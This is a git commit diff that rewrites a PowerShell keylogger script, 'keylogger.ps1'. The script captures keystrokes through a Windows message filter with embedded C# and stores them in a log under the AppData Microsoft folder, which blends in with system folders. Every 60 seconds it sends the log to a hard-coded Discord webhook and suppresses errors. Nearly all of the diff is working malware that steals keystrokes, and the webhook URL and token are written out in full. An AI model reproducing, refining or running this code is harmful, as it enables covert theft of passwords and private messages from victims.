cb827fded1b21620bdb6636b08bf51095adc6dae
Yt Designs <52629502+ZiteDesigns@users.noreply.github.com>
2025-08-06 09:39:22 -0400

    Update keylogger.ps1

--- keylogger.ps1
+++ keylogger.ps1
@@ -1,53 +1,69 @@
 # Config
 $logFile = "$env:APPDATA\Microsoft\keylog.txt"
 $webhookUrl = "https://discord.com/api/webhooks/1400154362399031406/DGLbSSN0EwdtdwbfECMX3S7WveKMCmsxGyXGfDFEzQFjiOl9dzlNoebvkt_yMi4pxSQs"
-# CONFIG
 
 
-
-# SETUP
+# Setup
 Add-Type -AssemblyName System.Windows.Forms
-$global:pressedKeys = ""
+$null = New-Item -Path $logFile -ItemType File -Force
 
-# SEND TO DISCORD FUNCTION
+# Function: Send logs to Discord
 function Send-ToDiscord {
     if (Test-Path $logFile) {
         $content = Get-Content $logFile -Raw
         if ($content.Length -gt 0) {
             $payload = @{
-                content = "**Keylog update**`n```\n$content\n```"
+                content = "**Keylog Update**`n```\n$content\n```"
             } | ConvertTo-Json -Compress
-
             try {
                 Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
                 Clear-Content $logFile
             } catch {
-                # Silent fail
+                # ignore errors
             }
         }
     }
 }
 
-# TIMER TO SEND EVERY 60 SECONDS
+# Timer: Every 60 seconds
 $timer = New-Object Timers.Timer
 $timer.Interval = 60000
 $timer.AutoReset = $true
 $timer.Enabled = $true
 Register-ObjectEvent -InputObject $timer -EventName Elapsed -Action { Send-ToDiscord }
 
-# KEYLOGGER FILTER
-[System.Windows.Forms.Application]::AddMessageFilter([System.Windows.Forms.IMessageFilter]{
-    PreFilterMessage = {
-        $msg = $_.Msg
-        $wParam = $_.WParam.ToInt32()
-        if ($msg -eq 0x100) {
-            $key = [System.Windows.Forms.Keys]$wParam
-            Add-Content -Path $logFile -Value "$key "
-        }
-        return $false
-    }
-})
+# Custom message filter class
+Add-Type @"
+using System;
+using System.Windows.Forms;
+using System.Runtime.InteropServices;
 
-# RUN
+public class KeyLogger : IMessageFilter {
+    [DllImport("user32.dll")]
+    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
+    [DllImport("user32.dll")]
+    public static extern bool GetKeyboardState(byte[] lpKeyState);
+
+    public bool PreFilterMessage(ref Message m) {
+        const int WM_KEYDOWN = 0x0100;
+        if (m.Msg == WM_KEYDOWN) {
+            int vkCode = m.WParam.ToInt32();
+            byte[] keyboardState = new byte[256];
+            GetKeyboardState(keyboardState);
+            System.Text.StringBuilder buffer = new System.Text.StringBuilder(2);
+            ToUnicode((uint)vkCode, 0, keyboardState, buffer, buffer.Capacity, 0);
+            string key = buffer.ToString();
+            System.IO.File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\keylog.txt", key);
+        }
+        return false;
+    }
+}
+"@
+
+# Register message filter
+$keyLogger = New-Object KeyLogger
+[System.Windows.Forms.Application]::AddMessageFilter($keyLogger)
+
+# Start the message loop
 [System.Windows.Forms.Application]::Run()
-# 
+
